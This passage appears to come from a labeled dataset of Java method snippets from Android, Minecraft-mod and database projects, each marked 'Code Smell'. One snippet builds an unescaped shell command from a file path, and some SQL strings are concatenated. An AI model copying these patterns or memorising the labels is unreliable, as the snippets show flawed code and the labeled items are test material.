        for (int j=0; j < Config.getCooperateWaterList().size(); j++) {
          if (Config.getCooperateWaterList().get(j).equals(cooperationId)) {
            index=j;
            break;
          }
        }
        if (index >= 0) {
          int num=Config.getcooperateWaterNumList().get(index);
          if (num > waterDayLimit)           num=waterDayLimit;
          if (num > userCurrentEnergy)           num=userCurrentEnergy;
          if (num > 0)           cooperateWater(FriendIdMap.getCurrentUid(),cooperationId,num,name);
        }
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""start.run err:"");
    Log.printStackTrace(TAG,t);
  }
  CooperationIdMap.saveIdMap();
}",1,Code Smell
"public static void applyRecipeOn(ItemEntity entity,Recipe<?> recipe){
  List<ItemStack> stacks=applyRecipeOn(entity.level(),entity.getItem(),recipe);
  if (stacks == null)   return;
  if (stacks.isEmpty()) {
    entity.discard();
    return;
  }
  entity.setItem(stacks.remove(0));
  for (  ItemStack additional : stacks) {
    ItemEntity entityIn=new ItemEntity(entity.level(),entity.getX(),entity.getY(),entity.getZ(),additional);
    entityIn.setDeltaMovement(entity.getDeltaMovement());
    entity.level().addFreshEntity(entityIn);
  }
}
public static List<ItemStack> applyRecipeOn(Level level,ItemStack stackIn,Recipe<?> recipe){
  List<ItemStack> stacks;
  if (recipe instanceof ProcessingRecipe<?>) {
    stacks=new ArrayList<>();
    for (int i=0; i < stackIn.getCount(); i++) {
      List<ProcessingOutput> outputs=pr instanceof ManualApplicationRecipe ? mar.getRollableResults() : pr.getRollableResults();
      for (      ItemStack stack : pr.rollResults(outputs)) {
        for (        ItemStack previouslyRolled : stacks) {
          if (stack.isEmpty())           continue;
          if (!ItemHandlerHelper.canItemStacksStack(stack,previouslyRolled))           continue;
          int amount=Math.min(previouslyRolled.getMaxStackSize() - previouslyRolled.getCount(),stack.getCount());
          previouslyRolled.grow(amount);
          stack.shrink(amount);
        }
        if (stack.isEmpty())         continue;
        stacks.add(stack);
      }
    }
  }
 else {
    ItemStack out=recipe.getResultItem(level.registryAccess()).copy();
    stacks=ItemHelper.multipliedOutput(stackIn,out);
  }
  return stacks;
}",1,Code Smell
"@Override public void onClick(View v){
  if (v == buttonSave) {
    String t=editGamedir.getText().toString();
    if (t.charAt(t.length() - 1) == '/') {
      StringBuilder tmp=new StringBuilder();
      for (int a=0; a < t.length() - 1; a++) {
        tmp.append(t.charAt(a));
      }
      t=tmp.toString();
      editGamedir.setText(t);
    }
    final File dir=new File(t);
    if (dir.exists() && !dir.isDirectory()) {
      DialogUtils.createSingleChoiceDialog(mContext,mContext.getString(R.string.title_error),mContext.getString(R.string.tips_target_dir_is_file),mContext.getString(R.string.title_ok),null);
    }
 else     if (!dir.exists()) {
      DialogUtils.createBothChoicesDialog(mContext,mContext.getString(R.string.title_warn),mContext.getString(R.string.tips_target_dir_is_not_exist),mContext.getString(R.string.title_ok),mContext.getString(R.string.title_cancel),new DialogSupports(){
        @Override public void runWhenPositive(){
          if (!GamedirManager.setGamedir(mContext,OldMainActivity.Setting,SettingJson.getDEFAULT_GAMEDIR())) {
            DialogUtils.createSingleChoiceDialog(mContext,mContext.getString(R.string.title_error),mContext.getString(R.string.tips_failed_to_revise_game_dir),mContext.getString(R.string.title_ok),null);
          }
 else {
            DialogUtils.createSingleChoiceDialog(mContext,mContext.getString(R.string.title_note),mContext.getString(R.string.tips_successed_to_revise_game_dir),mContext.getString(R.string.title_ok),null);
          }
        }
      }
);
    }
 else {
      if (!GamedirManager.setGamedir(mContext,OldMainActivity.Setting,SettingJson.getDEFAULT_GAMEDIR())) {
        DialogUtils.createSingleChoiceDialog(mContext,mContext.getString(R.string.title_error),mContext.getString(R.string.tips_failed_to_revise_game_dir),mContext.getString(R.string.title_ok),null);
      }
 else {
        DialogUtils.createSingleChoiceDialog(mContext,mContext.getString(R.string.title_note),mContext.getString(R.string.tips_successed_to_revise_game_dir),mContext.getString(R.string.title_ok),null);
      }
    }
  }
  if (v == layoutPublic) {
    editGamedir.setText(GamedirManager.PUBLIC_GAMEDIR);
  }
  if (v == layoutPrivate) {
    editGamedir.setText(GamedirManager.PRIVATE_GAMEDIR);
  }
}",1,Code Smell
"public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,boolean createNew){
  return replaceEmoji(cs,fontMetrics,AndroidUtilities.dp(16),createNew,null);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,int size,boolean createNew){
  return replaceEmoji(cs,fontMetrics,size,createNew,null);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,int size,boolean createNew,int[] emojiOnly){
  return replaceEmoji(cs,fontMetrics,createNew,emojiOnly,DynamicDrawableSpan.ALIGN_BOTTOM);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,boolean createNew,int[] emojiOnly,int alignment){
  if (NekoConfig.useSystemEmoji.Bool() || cs == null || cs.length() == 0) {
    return cs;
  }
  Spannable s;
  if (!createNew && cs instanceof Spannable) {
    s=(Spannable)cs;
  }
 else {
    s=Spannable.Factory.getInstance().newSpannable(cs.toString());
  }
  ArrayList<EmojiSpanRange> emojis=parseEmojis(s,emojiOnly);
  if (emojis.isEmpty()) {
    return cs;
  }
  AnimatedEmojiSpan[] animatedEmojiSpans=s.getSpans(0,s.length(),AnimatedEmojiSpan.class);
  EmojiSpan span;
  Drawable drawable;
  int limitCount=SharedConfig.getDevicePerformanceClass() >= SharedConfig.PERFORMANCE_CLASS_HIGH ? 100 : 50;
  for (int i=0; i < emojis.size(); ++i) {
    try {
      EmojiSpanRange emojiRange=emojis.get(i);
      if (animatedEmojiSpans != null) {
        boolean hasAnimated=false;
        for (int j=0; j < animatedEmojiSpans.length; ++j) {
          AnimatedEmojiSpan animatedSpan=animatedEmojiSpans[j];
          if (animatedSpan != null && s.getSpanStart(animatedSpan) == emojiRange.start && s.getSpanEnd(animatedSpan) == emojiRange.end) {
            hasAnimated=true;
            break;
          }
        }
        if (hasAnimated) {
          continue;
        }
      }
      drawable=Emoji.getEmojiDrawable(emojiRange.code);
      if (drawable != null) {
        span=new EmojiSpan(drawable,alignment,fontMetrics);
        span.emoji=emojiRange.code == null ? null : emojiRange.code.toString();
        s.setSpan(span,emojiRange.start,emojiRange.end,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    if ((Build.VERSION.SDK_INT < 23 || Build.VERSION.SDK_INT >= 29) && (i + 1) >= limitCount) {
      break;
    }
  }
  return s;
}",1,Code Smell
"@Override public boolean initOnce() throws Exception {
  if (QAppUtils.isQQnt()) {
    HookUtils.hookBeforeIfEnabled(this,XMethod.clz(""com.tencent.qqnt.aio.adapter.api.impl.RichMediaBrowserApiImpl"").name(""checkIsFavPicAndShowPreview"").ignoreParam().get(),param -> param.setResult(false));
    return true;
  }
  XposedHelpers.findAndHookMethod(_PicItemBuilder(),""onClick"",View.class,new XC_MethodHook(51){
    Field f_picExtraData=null;
    Field f_imageBizType=null;
    Field f_imageType=null;
    @Override protected void beforeHookedMethod(    MethodHookParam param) throws Throwable {
      if (LicenseStatus.sDisableCommonHooks || !isEnabled()) {
        return;
      }
      try {
        Object chatMsg=AIOUtilsImpl.getChatMessage((View)param.args[0]);
        if (chatMsg == null) {
          return;
        }
        if (f_picExtraData == null) {
          f_picExtraData=findField(chatMsg.getClass(),null,""picExtraData"");
          f_picExtraData.setAccessible(true);
        }
        Object picMessageExtraData=f_picExtraData.get(chatMsg);
        if (f_imageType == null) {
          f_imageType=findField(chatMsg.getClass(),null,""imageType"");
          f_imageType.setAccessible(true);
        }
        f_imageType.setInt(chatMsg,0);
        if (picMessageExtraData != null) {
          if (f_imageBizType == null) {
            f_imageBizType=findField(picMessageExtraData.getClass(),null,""imageBizType"");
            f_imageBizType.setAccessible(true);
          }
          f_imageBizType.setInt(picMessageExtraData,0);
        }
      }
 catch (      Throwable e) {
        traceError(e);
        throw e;
      }
    }
  }
);
  return true;
}",1,Code Smell
"public static CharSequence getChatSubtitle(TLRPC.Chat chat,TLRPC.ChatFull info,int onlineCount){
  CharSequence newSubtitle=null;
  if (ChatObject.isChannel(chat)) {
    if (info != null && info.participants_count != 0) {
      if (chat.megagroup) {
        if (onlineCount > 1) {
          newSubtitle=String.format(""%s, %s"",LocaleController.formatPluralString(""Members"",info.participants_count),LocaleController.formatPluralString(""OnlineCount"",Math.min(onlineCount,info.participants_count)));
        }
 else {
          newSubtitle=LocaleController.formatPluralString(""Members"",info.participants_count);
        }
      }
 else {
        int[] result=new int[1];
        boolean ignoreShort=AndroidUtilities.isAccessibilityScreenReaderEnabled();
        String shortNumber=ignoreShort ? String.valueOf(result[0]=info.participants_count) : LocaleController.formatShortNumber(info.participants_count,result);
        if (chat.megagroup) {
          newSubtitle=LocaleController.formatPluralString(""Members"",result[0]).replace(String.format(""%d"",result[0]),shortNumber);
        }
 else {
          newSubtitle=LocaleController.formatPluralString(""Subscribers"",result[0]).replace(String.format(""%d"",result[0]),shortNumber);
        }
      }
    }
 else {
      if (chat.megagroup) {
        if (info == null) {
          newSubtitle=LocaleController.getString(""Loading"",R.string.Loading).toLowerCase();
        }
 else {
          if (chat.has_geo) {
            newSubtitle=LocaleController.getString(""MegaLocation"",R.string.MegaLocation).toLowerCase();
          }
 else           if (ChatObject.isPublic(chat)) {
            newSubtitle=LocaleController.getString(""MegaPublic"",R.string.MegaPublic).toLowerCase();
          }
 else {
            newSubtitle=LocaleController.getString(""MegaPrivate"",R.string.MegaPrivate).toLowerCase();
          }
        }
      }
 else {
        if (ChatObject.isPublic(chat)) {
          newSubtitle=LocaleController.getString(""ChannelPublic"",R.string.ChannelPublic).toLowerCase();
        }
 else {
          newSubtitle=LocaleController.getString(""ChannelPrivate"",R.string.ChannelPrivate).toLowerCase();
        }
      }
    }
  }
 else {
    if (ChatObject.isKickedFromChat(chat)) {
      newSubtitle=LocaleController.getString(""YouWereKicked"",R.string.YouWereKicked);
    }
 else     if (ChatObject.isLeftFromChat(chat)) {
      newSubtitle=LocaleController.getString(""YouLeft"",R.string.YouLeft);
    }
 else {
      int count=chat.participants_count;
      if (info != null && info.participants != null) {
        count=info.participants.participants.size();
      }
      if (onlineCount > 1 && count != 0) {
        newSubtitle=String.format(""%s, %s"",LocaleController.formatPluralString(""Members"",count),LocaleController.formatPluralString(""OnlineCount"",onlineCount));
      }
 else {
        newSubtitle=LocaleController.formatPluralString(""Members"",count);
      }
    }
  }
  return newSubtitle;
}",1,Code Smell
"public static String pullFile(IDevice iDevice,String path){
  String result=null;
  File base=new File(""test-output"" + File.separator + ""pull"");
  String filename=base.getAbsolutePath() + File.separator + UUID.randomUUID();
  File file=new File(filename);
  file.mkdirs();
  String system=System.getProperty(""os.name"").toLowerCase();
  String processName=String.format(""process-%s-pull-file"",iDevice.getSerialNumber());
  if (GlobalProcessMap.getMap().get(processName) != null) {
    Process ps=GlobalProcessMap.getMap().get(processName);
    ps.children().forEach(ProcessHandle::destroy);
    ps.destroy();
  }
  try {
    Process process=null;
    String command=String.format(""%s -s %s pull %s %s"",getADBPathFromSystemEnv(),iDevice.getSerialNumber(),path,file.getAbsolutePath());
    if (system.contains(""win"")) {
      process=Runtime.getRuntime().exec(new String[]{""cmd"",""/c"",command});
    }
 else     if (system.contains(""linux"") || system.contains(""mac"")) {
      process=Runtime.getRuntime().exec(new String[]{""sh"",""-c"",command});
    }
    GlobalProcessMap.getMap().put(processName,process);
    boolean isRunning;
    int wait=0;
    do {
      Thread.sleep(500);
      wait++;
      isRunning=false;
      List<ProcessHandle> processHandleList=process.children().collect(Collectors.toList());
      if (processHandleList.size() == 0) {
        if (process.isAlive()) {
          isRunning=true;
        }
      }
 else {
        for (        ProcessHandle p : processHandleList) {
          if (p.isAlive()) {
            isRunning=true;
            break;
          }
        }
      }
      if (wait >= 20) {
        process.children().forEach(ProcessHandle::destroy);
        process.destroy();
        break;
      }
    }
 while (isRunning);
    File re=new File(filename + File.separator + (path.lastIndexOf(""/"") == -1 ? path : path.substring(path.lastIndexOf(""/""))));
    result=UploadTools.upload(re,""packageFiles"");
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
 finally {
    FileTool.deleteDir(file);
  }
  return result;
}",1,Code Smell
"public void setText(String text,boolean ellipsis,boolean animated){
  CharSequence nextString=text;
  if (ellipsis) {
    SpannableStringBuilder ssb=new SpannableStringBuilder(text);
    SpannableString ell=new SpannableString(""."");
    ell.setSpan(new VoIPEllipsizeSpan(textView),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    ssb.append(ell);
    nextString=ssb;
  }
  if (TextUtils.isEmpty(textView[0].getText())) {
    animated=false;
  }
  if (!animated) {
    if (animator != null) {
      animator.cancel();
    }
    animationInProgress=false;
    textView[0].setText(nextString);
    textView[0].setVisibility(View.VISIBLE);
    textView[1].setVisibility(View.GONE);
    timerView.setVisibility(View.GONE);
  }
 else {
    if (animationInProgress) {
      nextTextToSet=nextString;
      return;
    }
    if (timerShowing) {
      textView[0].setText(nextString);
      replaceViews(timerView,textView[0],null);
    }
 else {
      if (!textView[0].getText().equals(nextString)) {
        textView[1].setText(nextString);
        replaceViews(textView[0],textView[1],() -> {
          TextView v=textView[0];
          textView[0]=textView[1];
          textView[1]=v;
        }
);
      }
    }
  }
}",1,Code Smell
"/** 
 * Find a most likely 3d least squares formula for specified coordinates. ""retval"" should be a 1x4 size matrix.
 */
@UsedForTesting public static void get3DParameters(final float[] xs,final float[] ys,final float[][] retval) throws MatrixOperationFailedException {
  final int COEFF_COUNT=4;
  if (retval.length != COEFF_COUNT || retval[0].length != 1) {
    Log.d(TAG,""--- invalid length of 3d retval "" + retval.length + "", ""+ retval[0].length);
    return;
  }
  final int N=xs.length;
  final float[][] m0=new float[COEFF_COUNT][COEFF_COUNT];
  final float[][] m0Inv=new float[COEFF_COUNT][COEFF_COUNT];
  final float[][] m1=new float[COEFF_COUNT][N];
  final float[][] m2=new float[N][1];
  for (int i=0; i < COEFF_COUNT; ++i) {
    Arrays.fill(m0[i],0);
    for (int j=0; j < COEFF_COUNT; ++j) {
      final int pow=i + j;
      for (int k=0; k < N; ++k) {
        m0[i][j]+=(float)Math.pow(xs[k],pow);
      }
    }
  }
  MatrixUtils.inverse(m0,m0Inv);
  if (DEBUG) {
    MatrixUtils.dump(""m0-1"",m0Inv);
  }
  for (int i=0; i < COEFF_COUNT; ++i) {
    for (int j=0; j < N; ++j) {
      m1[i][j]=(i == 0) ? 1.0f : m1[i - 1][j] * xs[j];
    }
  }
  for (int i=0; i < N; ++i) {
    m2[i][0]=ys[i];
  }
  final float[][] m0Invxm1=new float[COEFF_COUNT][N];
  if (DEBUG) {
    MatrixUtils.dump(""a0"",m0Inv);
    MatrixUtils.dump(""a1"",m1);
  }
  MatrixUtils.multiply(m0Inv,m1,m0Invxm1);
  if (DEBUG) {
    MatrixUtils.dump(""a2"",m0Invxm1);
    MatrixUtils.dump(""a3"",m2);
  }
  MatrixUtils.multiply(m0Invxm1,m2,retval);
  if (DEBUG) {
    MatrixUtils.dump(""result"",retval);
  }
}",1,Code Smell
"/** 
 * Returns the last element of a sequence. (Defined by Enumerable.)
 */
public static <TSource>TSource last(Enumerable<TSource> enumerable){
  final ListEnumerable<TSource> list=enumerable instanceof ListEnumerable ? ((ListEnumerable<TSource>)enumerable) : null;
  if (list != null) {
    final List<TSource> rawList=list.toList();
    final int count=rawList.size();
    if (count > 0) {
      return rawList.get(count - 1);
    }
  }
 else {
    try (Enumerator<TSource> os=enumerable.enumerator()){
      if (os.moveNext()) {
        TSource result;
        do {
          result=os.current();
        }
 while (os.moveNext());
        return result;
      }
    }
   }
  throw new NoSuchElementException();
}
/** 
 * Returns the last element of a sequence that satisfies a specified condition.
 */
public static <TSource>TSource last(Enumerable<TSource> enumerable,Predicate1<TSource> predicate){
  final ListEnumerable<TSource> list=enumerable instanceof ListEnumerable ? ((ListEnumerable<TSource>)enumerable) : null;
  if (list != null) {
    final List<TSource> rawList=list.toList();
    final int count=rawList.size();
    for (int i=count - 1; i >= 0; --i) {
      TSource result=rawList.get(i);
      if (predicate.apply(result)) {
        return result;
      }
    }
  }
 else {
    try (Enumerator<TSource> os=enumerable.enumerator()){
      while (os.moveNext()) {
        TSource result=os.current();
        if (predicate.apply(result)) {
          while (os.moveNext()) {
            TSource element=os.current();
            if (predicate.apply(element)) {
              result=element;
            }
          }
          return result;
        }
      }
    }
   }
  throw new NoSuchElementException();
}",1,Code Smell
"private static InetAddress getLocalAddress0(){
  InetAddress localAddress=null;
  try {
    localAddress=InetAddress.getLocalHost();
    InetAddress addressItem=toValidAddress(localAddress);
    if (addressItem != null) {
      return addressItem;
    }
  }
 catch (  Throwable e) {
    logger.error(e.getMessage(),e);
  }
  try {
    Enumeration<NetworkInterface> interfaces=NetworkInterface.getNetworkInterfaces();
    if (null == interfaces) {
      return localAddress;
    }
    while (interfaces.hasMoreElements()) {
      try {
        NetworkInterface network=interfaces.nextElement();
        if (network.isLoopback() || network.isVirtual() || !network.isUp()) {
          continue;
        }
        Enumeration<InetAddress> addresses=network.getInetAddresses();
        while (addresses.hasMoreElements()) {
          try {
            InetAddress addressItem=toValidAddress(addresses.nextElement());
            if (addressItem != null) {
              try {
                if (addressItem.isReachable(100)) {
                  return addressItem;
                }
              }
 catch (              IOException e) {
              }
            }
          }
 catch (          Throwable e) {
            logger.error(e.getMessage(),e);
          }
        }
      }
 catch (      Throwable e) {
        logger.error(e.getMessage(),e);
      }
    }
  }
 catch (  Throwable e) {
    logger.error(e.getMessage(),e);
  }
  return localAddress;
}",1,Code Smell
"public static Validated<CaretRange> build(String pattern,@Nullable String metadataPattern){
  Matcher matcher=CARET_RANGE_PATTERN.matcher(pattern);
  if (!matcher.matches()) {
    return Validated.invalid(""caretRange"",pattern,""not a caret range"");
  }
  String major=matcher.group(1);
  String minor=normalizeWildcard(matcher.group(2));
  String patch=normalizeWildcard(matcher.group(3));
  String micro=normalizeWildcard(matcher.group(4));
  if (""*"".equals(minor) && (matcher.group(3) != null || matcher.group(4) != null)) {
    return Validated.invalid(""caretRange"",pattern,""not a caret range: nothing can follow a wildcard"");
  }
 else   if (""*"".equals(patch) && (matcher.group(4) != null)) {
    return Validated.invalid(""caretRange"",pattern,""not a caret range: nothing can follow a wildcard"");
  }
  String lower;
  String upper;
  if (minor == null) {
    lower=major;
  }
 else   if (patch == null) {
    lower=major + ""."" + minor;
  }
 else   if (micro == null) {
    lower=major + ""."" + minor+ "".""+ patch;
  }
 else {
    lower=major + ""."" + minor+ "".""+ patch+ "".""+ micro;
  }
  if (!""0"".equals(major) || minor == null) {
    upper=Integer.toString(parseInt(major) + 1);
  }
 else   if (!""0"".equals(minor) || patch == null) {
    upper=major + ""."" + (parseInt(minor) + 1);
  }
 else   if (!""0"".equals(patch) && micro == null) {
    upper=major + ""."" + minor+ "".""+ patch;
  }
 else {
    upper=major + ""."" + minor+ "".""+ patch+ "".""+ micro;
  }
  return Validated.valid(""caretRange"",new CaretRange(lower,upper,metadataPattern));
}",1,Code Smell
"@Override public void accept(String className,ClassNode classNode,IMixinInfo mixinInfo){
  var shadow=new HashSet<String>();
  var superCall=new HashSet<String>();
  var create=new ArrayList<MethodNode>();
  for (var iterator=classNode.methods.iterator(); iterator.hasNext(); ) {
    var method=iterator.next();
    if (!Modifier.isStatic(method.access) && method.invisibleAnnotations != null) {
      for (      var ann : method.invisibleAnnotations) {
        if (SHADOW.equals(ann.desc)) {
          shadow.add(method.name + method.desc);
          iterator.remove();
          break;
        }
 else         if (CREATE.equals(ann.desc)) {
          create.add(method);
          break;
        }
 else         if (SUPER.equals(ann.desc)) {
          superCall.add(method.name + method.desc);
          iterator.remove();
          break;
        }
      }
    }
  }
  if (!create.isEmpty()) {
    var present=new HashSet<String>();
    for (    var method : classNode.methods) {
      if (method.name.equals(""<init>"")) {
        present.add(method.desc);
      }
    }
    var invalid=shadow.stream().filter(it -> present.stream().noneMatch(it::endsWith)).toList();
    if (!invalid.isEmpty()) {
      throw new IllegalArgumentException(""@ShadowConstructor refers to missing constructor. Class "" + className + "", desc: ""+ String.join("", "",invalid));
    }
    var duplicate=create.stream().filter(it -> present.contains(it.desc)).map(it -> it.name + it.desc).toList();
    if (!duplicate.isEmpty()) {
      throw new IllegalArgumentException(""@CreateConstructor refers to present constructor. Class "" + className + "", desc: ""+ String.join("", "",duplicate));
    }
    for (    var method : create) {
      remapCtor(classNode,method,shadow,superCall);
    }
  }
}
",1,Code Smell
"private void removeErroneousNodes(){
  mapSupportPoints=new HashMap<>();
  calcReachabilitySuppPoints(StatEdge.TYPE_REGULAR);
  iterateReachability(new IReachabilityAction(){
    @Override public boolean action(    Statement node,    HashMap<Integer,FastFixedSet<Integer>> mapSets){
      Integer nodeid=node.id;
      FastFixedSet<Integer> setReachability=mapSets.get(nodeid);
      List<FastFixedSet<Integer>> lstPredSets=new ArrayList<>();
      for (      StatEdge prededge : node.getPredecessorEdges(StatEdge.TYPE_REGULAR)) {
        FastFixedSet<Integer> setPred=mapSets.get(prededge.getSource().id);
        if (setPred == null) {
          setPred=mapSupportPoints.get(prededge.getSource().id);
        }
        lstPredSets.add(setPred);
      }
      for (      Integer id : setReachability) {
        FastFixedSet<Integer> setReachabilityCopy=setReachability.getCopy();
        FastFixedSet<Integer> setIntersection=factory.spawnEmptySet();
        boolean isIntersectionInitialized=false;
        for (        FastFixedSet<Integer> predset : lstPredSets) {
          if (predset.contains(id)) {
            if (!isIntersectionInitialized) {
              setIntersection.union(predset);
              isIntersectionInitialized=true;
            }
 else {
              setIntersection.intersection(predset);
            }
          }
        }
        if (nodeid != id.intValue()) {
          setIntersection.add(nodeid);
        }
 else {
          setIntersection.remove(nodeid);
        }
        setReachabilityCopy.complement(setIntersection);
        mapExtPostdominators.get(id).complement(setReachabilityCopy);
      }
      return false;
    }
  }
,StatEdge.TYPE_REGULAR);
  FastFixedSet<Integer> setHandlers=factory.spawnEmptySet();
  boolean handlerfound=false;
  for (  Statement stat : statement.getStats()) {
    if (stat.getPredecessorEdges(Statement.STATEDGE_DIRECT_ALL).isEmpty() && !stat.getPredecessorEdges(StatEdge.TYPE_EXCEPTION).isEmpty()) {
      setHandlers.add(stat.id);
      handlerfound=true;
    }
  }
  if (handlerfound) {
    for (    FastFixedSet<Integer> set : mapExtPostdominators.values()) {
      set.complement(setHandlers);
    }
  }
}
",1,Code Smell
"public <M extends Metadata>UnboundMetadata<M> apply(Class<? extends RelNode> relClass,Class<? extends M> metadataClass){
  if (metadataClass == metadataClass0) {
    return apply(relClass);
  }
 else {
    return null;
  }
}
@SuppressWarnings({""unchecked"",""SuspiciousMethodCalls""}) public <M extends Metadata>UnboundMetadata<M> apply(Class<? extends RelNode> relClass){
  List<Class<? extends RelNode>> newSources=new ArrayList<>();
  for (; ; ) {
    UnboundMetadata<M> function=map.get(relClass);
    if (function != null) {
      for (      @SuppressWarnings(""rawtypes"") Class clazz : newSources) {
        map.put(clazz,function);
      }
      return function;
    }
 else {
      newSources.add(relClass);
    }
    for (    Class<?> interfaceClass : relClass.getInterfaces()) {
      if (RelNode.class.isAssignableFrom(interfaceClass)) {
        final UnboundMetadata<M> function2=map.get(interfaceClass);
        if (function2 != null) {
          for (          @SuppressWarnings(""rawtypes"") Class clazz : newSources) {
            map.put(clazz,function2);
          }
          return function2;
        }
      }
    }
    if (RelNode.class.isAssignableFrom(relClass.getSuperclass())) {
      relClass=(Class<RelNode>)relClass.getSuperclass();
    }
 else {
      return null;
    }
  }
}",1,Code Smell
"public static String formatDiff(String expected,String output){
  if ((StringUtils.isBlank(expected) && StringUtils.isNotBlank(output)) || (StringUtils.isNotBlank(expected) && StringUtils.isBlank(output))) {
    return FLAG + ""E"" + output+ FLAG;
  }
 else   if (StringUtils.isBlank(expected) || StringUtils.isBlank(output) || output.equals(expected)) {
    return output;
  }
 else {
    boolean isDiff=false;
    StringBuilder sb=new StringBuilder();
    for (int i=0; i < output.length(); i++) {
      if (i >= expected.length()) {
        if (!isDiff) {
          sb.append(FLAG).append(""E"");
        }
        sb.append(output.substring(i)).append(FLAG);
        isDiff=true;
        break;
      }
 else {
        if (output.charAt(i) == expected.charAt(i)) {
          if (isDiff) {
            sb.append(FLAG);
            isDiff=false;
          }
          sb.append(output.charAt(i));
        }
 else {
          if (!isDiff) {
            sb.append(FLAG).append(""E"");
            isDiff=true;
          }
          sb.append(output.charAt(i));
        }
      }
    }
    if (isDiff) {
      sb.append(FLAG);
    }
    return sb.toString();
  }
}",1,Code Smell
"private static void createDistributedTable(String tableName,CitusGlobalState globalState) throws Exception {
  List<PostgresColumn> columns=new ArrayList<>();
  List<String> tableConstraints=getTableConstraints(tableName,globalState);
  if (tableConstraints.isEmpty()) {
    String queryString=""SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '"" + tableName + ""';"";
    SQLQueryAdapter query=new SQLQueryAdapter(queryString);
    SQLancerResultSet rs=query.executeAndGet(globalState,""SELECT column_name, data_type FROM information_schema.columns WHERE table_name = ?;"",tableName);
    while (rs.next()) {
      String columnName=rs.getString(1);
      String dataType=rs.getString(2);
      if (dataTypeHasDefaultOperatorForPartition(dataType)) {
        PostgresColumn c=new PostgresColumn(columnName,PostgresSchema.getColumnType(dataType));
        columns.add(c);
      }
    }
  }
 else {
    HashMap<PostgresColumn,List<String>> columnConstraints=new HashMap<>();
    String queryString=""SELECT c.column_name, c.data_type, tc.constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE (constraint_type = 'PRIMARY KEY' OR constraint_type = 'UNIQUE' OR constraint_type = 'EXCLUDE') AND c.table_name = '"" + tableName + ""';"";
    SQLQueryAdapter query=new SQLQueryAdapter(queryString);
    SQLancerResultSet rs=query.executeAndGet(globalState,""SELECT c.column_name, c.data_type, tc.constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE (constraint_type = 'PRIMARY KEY' OR constraint_type = 'UNIQUE' OR constraint_type = 'EXCLUDE') AND c.table_name = ?;"",tableName);
    while (rs.next()) {
      String columnName=rs.getString(1);
      String dataType=rs.getString(2);
      String constraintType=rs.getString(3);
      if (dataTypeHasDefaultOperatorForPartition(dataType)) {
        PostgresColumn c=new PostgresColumn(columnName,PostgresSchema.getColumnType(dataType));
        if (columnConstraints.containsKey(c)) {
          columnConstraints.get(c).add(constraintType);
        }
 else {
          columnConstraints.put(c,new ArrayList<>(Arrays.asList(constraintType)));
        }
      }
    }
    for (    PostgresColumn c : columnConstraints.keySet()) {
      if (tableConstraints.size() == columnConstraints.get(c).size()) {
        columns.add(c);
      }
    }
  }
  distributeTable(columns,tableName,globalState);
}",1,Code Smell
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,P p){
  J.MethodDeclaration m=super.visitMethodDeclaration(method,p);
  J.ClassDeclaration classDecl=getCursor().firstEnclosing(J.ClassDeclaration.class);
  if (classDecl == null) {
    return m;
  }
  if (methodMatcher.matches(method,classDecl)) {
    J.Modifier.Type currentMethodAccessLevel=m.getModifiers().stream().map(J.Modifier::getType).filter(EXPLICIT_ACCESS_LEVELS::contains).findAny().orElse(null);
    if (currentMethodAccessLevel == newAccessLevel) {
      return m;
    }
    if (EXPLICIT_ACCESS_LEVELS.contains(currentMethodAccessLevel) && EXPLICIT_ACCESS_LEVELS.contains(newAccessLevel)) {
      m=m.withModifiers(ListUtils.map(m.getModifiers(),mod -> mod.getType() == currentMethodAccessLevel ? mod.withType(newAccessLevel) : mod));
    }
 else     if (currentMethodAccessLevel == null) {
      J.Modifier mod=new J.Modifier(Tree.randomId(),Space.build("" "",emptyList()),Markers.EMPTY,null,newAccessLevel,Collections.emptyList());
      m=m.withModifiers(ListUtils.concat(mod,m.getModifiers()));
      if (method.getModifiers().isEmpty()) {
        J.TypeParameters typeParams=m.getPadding().getTypeParameters();
        if (typeParams == null) {
          TypeTree returnExpr=m.getReturnTypeExpression();
          if (returnExpr == null) {
            m=m.withModifiers(Space.formatFirstPrefix(m.getModifiers(),m.getName().getPrefix()));
            m=m.withName(m.getName().withPrefix(Space.format("" "")));
          }
 else {
            m=m.withModifiers(Space.formatFirstPrefix(m.getModifiers(),returnExpr.getPrefix()));
            m=m.withReturnTypeExpression(returnExpr.withPrefix(Space.format("" "")));
          }
        }
 else {
          m=m.withModifiers(Space.formatFirstPrefix(m.getModifiers(),typeParams.getPrefix()));
          m=m.getPadding().withTypeParameters(typeParams.withPrefix(Space.format("" "")));
        }
      }
 else {
        m=m.withModifiers(ListUtils.map(m.getModifiers(),(i,mod2) -> {
          if (i == 0) {
            return mod2.withPrefix(method.getModifiers().get(0).getPrefix());
          }
 else           if (i == 1) {
            return mod2.withPrefix(Space.format("" ""));
          }
          return mod2;
        }
));
      }
    }
 else     if (newAccessLevel == null) {
      final List<Comment> modifierComments=new ArrayList<>();
      List<J.Modifier> modifiers=ListUtils.map(m.getModifiers(),mod -> {
        if (mod.getType() == currentMethodAccessLevel) {
          modifierComments.addAll(mod.getComments());
          return null;
        }
        if (!modifierComments.isEmpty()) {
          J.Modifier nextModifier=mod.withComments(ListUtils.concatAll(new ArrayList<>(modifierComments),mod.getComments()));
          modifierComments.clear();
          return nextModifier;
        }
        return mod;
      }
);
      if (!modifierComments.isEmpty()) {
